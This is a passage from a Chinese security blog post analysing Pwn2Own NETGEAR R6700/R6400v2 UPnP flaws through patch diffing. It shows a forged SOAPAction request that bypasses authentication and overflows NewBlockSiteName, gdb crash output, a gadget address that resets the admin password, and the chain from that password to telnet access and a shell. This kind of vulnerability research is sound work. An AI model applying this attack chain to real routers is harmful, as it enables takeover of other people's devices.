省略部分内容</span><br><span class="line"><span class="keyword">POST</span> <span class="string">soap/server_sa</span> HTTP/1.1</span><br><span class="line"><span class="attribute">SOAPAction</span>: urn:NETGEAR-ROUTER:service:DeviceConfig:1#SOAPLoginDeviceInfo</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;</span><br><span class="line">&lt;SOAP-ENV:Body&gt;</span><br><span class="line"><span class="attribute">SetNetgearDeviceName</span></span><br><span class="line"><span class="attribute">&lt;NewBlockSiteName&gt;123456</span></span><br><span class="line"><span class="attribute">&lt;/NewBlockSiteName&gt;</span></span><br><span class="line"><span class="attribute">&lt;/SOAP-ENV:Body&gt;</span></span><br><span class="line"><span class="attribute">&lt;/SOAP-ENV:Envelope&gt;</span></span><br></pre></td></tr></table></figure><p>首先，在<code>sa_method_check()</code>中，在查找<code>SOAPAction</code>服务时，对应的表项<code>DeviceInfo</code>排在<code>DeviceConfig</code>之前，因此会匹配到<code>DeviceInfo</code>，对应的<code>soap_action</code>类型为0。其次，在对<code>SOAPAction</code>头部进行判断时，某个<code>strncmp()</code>会比对成功返回0，使得对应的<code>if</code>条件为<code>false</code>，程序继续执行后会调用<code>sa_processResponse()</code>。在<code>sa_processResponse()</code>中，由于<code>soap_action</code>的类型为0，程序会进入<code>case 0</code>分支，在查找关键字时会匹配到下面的<code>SetNetgearDeviceName</code>，因而会跳到对应的分支继续执行，最终到达溢出漏洞点。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>现在可以绕过认证并触发溢出漏洞了，该如何对溢出漏洞进行利用呢？溢出时的<code>crash</code>信息如下，可以看到，寄存器<code>r4</code>~`r8<code>和</code>pc`的内容都被覆盖了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">(gdb) c                                                                   </span><br><span class="line">Continuing.                                                               </span><br><span class="line">                                                                          </span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">Cannot access memory at address 0x63636362                                </span><br><span class="line">0x63636362 in ?? ()                                                       </span><br><span class="line">(gdb) i r                                                                 </span><br><span class="line">r0             0x0      0                                                 </span><br><span class="line">r1             0x662bc  418492                                            </span><br><span class="line">r2             0x662bc  418492                                            </span><br><span class="line">r3             0xbeece355       3203195733                                </span><br><span class="line">r4             0x61616161       1633771873                                </span><br><span class="line">r5             0x61616161       1633771873                                </span><br><span class="line">r6             0x61616161       1633771873                                </span><br><span class="line">r7             0x61616161       1633771873                                </span><br><span class="line">r8             0x62626262       1650614882                                </span><br><span class="line">r9             0x1      1                                                 </span><br><span class="line">r10            0x0      0                                                 </span><br><span class="line">r11            0xbeeccf80       3203190656                                </span><br><span class="line">r12            0x0      0                                                 </span><br><span class="line">sp             0xbeeccbb0       0xbeeccbb0                                </span><br><span class="line">lr             0x24c38  150584                                            </span><br><span class="line">pc             0x63636362       0x63636362                                </span><br><span class="line">cpsr           0x60000030       1610612784                                </span><br><span class="line">(gdb) x/10wx $sp-0x10                                                     </span><br><span class="line">0xbeeccba0:     0x61616161      0x61616161      0x62626262      0x63636363</span><br><span class="line">0xbeeccbb0:     0x00000000      0x0000ff37      0x0000041e      0xbeeccf80</span><br><span class="line">0xbeeccbc0:     0xbeeccf4c      0x00000002                                </span><br></pre></td></tr></table></figure><p>前面提到过，若想要实现任意代码执行，需要解决<code>NULL</code>字符截断的问题。在仅有一次覆盖返回地址的机会时，该如何构造<code>payload</code>呢? 在有限的条件下，<code>Pedro Ribeiro</code>采取了一种巧妙的方式，通过单次覆盖来修改设备管理员账户的密码，而<code>upnpd</code>程序中正好存在这一代码片段。这段代码不依赖于其他的寄存器以及栈空间内容等，跳转执行成功后程序还是会崩溃，但管理员账户的密码已成功修改成<code>password</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">; V1.0.4.82 版本</span><br><span class="line">.text:00039A58 LDR             R0, &#x3D;aHttpPasswd ; &quot;http_passwd&quot;</span><br><span class="line">.text:00039A5C LDR             R1, &#x3D;aPassword ; &quot;password&quot;</span><br><span class="line">.text:00039A60 BL              acosNvramConfig_set</span><br></pre></td></tr></table></figure><p>有了管理员账户和密码后，可以登录设备的管理界面，对设备的配置进行修改，但如何获取设备的<code>shell</code>以实现代码执行呢?<code>Pedro Ribeiro</code>指出，在<code>R6700v3</code>型号的设备上，可以通过某种方式开启设备的<code>telnet</code>服务，再利用已有的管理员账号和密码登录，即可获取设备的<code>shell</code>。</p><p><code>Pedro Ribeiro</code>给出的完整利用流程如下：</p><ul><li>结合认证绕过漏洞和缓冲区溢出漏洞，通过发送<code>POST</code>请求来修改管理员账号的密码；</li><li>利用已有的管理员账号和密码，登录web页面，再次修改管理员账号的密码；</li><li>通过向设备的<code>23/udp</code>端口发送<code>telnetenable</code>数据包，以开启<code>telnet</code>服务；</li><li>利用已有的管理员账号和密码，登录<code>telnet</code>服务，即可成功获取设备的<code>shell</code></li></ul><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>本文从补丁比对出发，结合<code>Pedro Ribeiro</code>的<code>write up</code>，对<code>NETGEAR</code> <code>R6400v2</code>型号设备中的<code>UPnP</code>漏洞进行了定位和分析。</p><ul><li>认证绕过：在对<code>SOAPAction</code>头进行解析和处理时，由于缺乏适当的校验，可通过伪造<code>SOAPAction</code>头部来绕过认证，从而访问某些<code>API</code></li><li>缓冲区溢出：在解析和处理<code>POST</code>请求中的数据时，由于缺乏长度校验，通过伪造超长的数据，最终会造成在<code>sa_setBlockName()</code>函数中出现缓冲区溢出</li></ul><p>栈溢出漏洞本身比较简单，但漏洞利用却存在<code>NULL</code>字符截断的问题，在只有一次覆盖返回地址的机会时，<code>Pedro Ribeiro</code>采用了一种巧妙的方式，值得借鉴和学习。</p><h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><ul><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuemVyb2RheWluaXRpYXRpdmUuY29tL2Fkdmlzb3JpZXMvWkRJLTIwLTcwMy8=">(0Day) (Pwn2Own) NETGEAR R6700 UPnP SOAPAction Authentication Bypass Vulnerability<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuemVyb2RheWluaXRpYXRpdmUuY29tL2Fkdmlzb3JpZXMvWkRJLTIwLTcwNC8=">(0Day) (Pwn2Own) NETGEAR R6700 UPnP NewBlockSiteName Stack-based Buffer Overflow Remote Code Execution Vulnerability<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9rYi5uZXRnZWFyLmNvbS8wMDAwNjE5ODIvU2VjdXJpdHktQWR2aXNvcnktZm9yLU11bHRpcGxlLVZ1bG5lcmFiaWxpdGllcy1vbi1Tb21lLVJvdXRlcnMtTW9iaWxlLVJvdXRlcnMtTW9kZW1zLUdhdGV3YXlzLWFuZC1FeHRlbmRlcnM=">Security Advisory for Multiple Vulnerabilities on Some Routers, Mobile Routers, Modems, Gateways, and Extenders<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BlZHJpYi9Qb0MvYmxvYi9kYTMxN2JiYjIyYWJjMmM4OGM4ZmNhZDA2NjhjZGI5NGIyYmEwYTZmL2Fkdmlzb3JpZXMvUHduMk93bi9Ub2t5b18yMDE5L3Rva3lvX2RyaWZ0L3Rva3lvX2RyaWZ0Lm1k">tokyo_drift<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9zZWdtZW50ZmF1bHQuY29tL2EvMTE5MDAwMDAwMzc2MjI3OQ==">SOAP 介绍<i class="fa fa-external-link-alt"></i></span></li></ul><br><blockquote><p>本文首发于安全客，文章链接：<span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMjA5MjMy">https://www.anquanke.com/post/id/209232<i class="fa fa-external-link-alt"></i></span></p></blockquote></div><footer class="post-footer"><div class="reward-container"><div></div><button>赞赏</button><div class="post-reward"><div><img src="/uploads/wechatpay.png" alt="cq674350529 微信"> <span>微信</span></div></div></div><div class="post-tags"><a href="/tags/netgear/" rel="tag"># netgear</a></div><div class="post-nav"><div class="post-nav-item"><a href="/2020/07/01/MikroTik-SMB%E6%B5%8B%E8%AF%95%E4%B9%8BMutiny-Fuzzer/" rel="prev" title="MikroTik SMB测试之Mutiny Fuzzer"><i class="fa fa-chevron-left"></i> MikroTik SMB测试之Mutiny Fuzzer</a></div><div class="post-nav-item"><a href="/2020/09/03/Create-Wireshark-Dissector-in-Lua/" rel="next" title="Create Wireshark Dissector in Lua">Create Wireshark Dissector in Lua <i class="fa fa-chevron-right"></i></a></div></div></footer></article></div><div class="comments" id="waline"></div></div></main><footer class="footer"><div class="footer-inner"><div class="copyright">&copy; 2016 – <span itemprop="copyrightYear">2022</span> <span class="with-love"><i class="fa fa-heart"></i> </span><span class="author" itemprop="copyrightHolder">cq674350529</span></div></div></footer><script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.5.0/pjax.min.js" integrity="sha256-3NkoLDrmHLTYj7csHIZSr0MHAFTXth7Ua/DDt4MRUAg=" crossorigin="anonymous"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js" integrity="sha256-yt2kYMy0w8AbtF89WXb2P1rfjcP/HTHLT7097U8Y5b8=" crossorigin="anonymous"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script><script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/pjax.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.0/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script><script src="/js/third-party/search/local-search.js"></script><script src="/js/third-party/fancybox.js"></script><script class="next-config" data-name="waline" type="application/json">{"lang":null,"enable":true,"serverURL":"waline-blog-alpha.vercel.app","cssUrl":"https://unpkg.com/@waline/client@v2/dist/waline.css","commentCount":true,"pageview":false,"placeholder":":)填上邮箱可以收到回复邮件","avatar":"mm","meta":["nick","mail","link"],"pageSize":10,"visitor":false,"comment_count":true,"requiredFields":[],"libUrl":"//unpkg.com/@waline/client@v2/dist/waline.js","el":"#waline","comment":true,"path":"/2020/07/04/Pwn2Own-Netgear-R6700-UPnP%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"}</script><link rel="stylesheet" href="https://unpkg.com/@waline/client@v2/dist/waline.css"><script>document.addEventListener('page:loaded', () => {
  NexT.utils.loadComments(CONFIG.waline.el).then(() =>
    NexT.utils.getScript(CONFIG.waline.libUrl, { condition: window.Waline })
  ).then(() => 
    Waline.init(Object.assign({}, CONFIG.waline,{ el: document.querySelector(CONFIG.waline.el) }))
  );
});</script></body></html>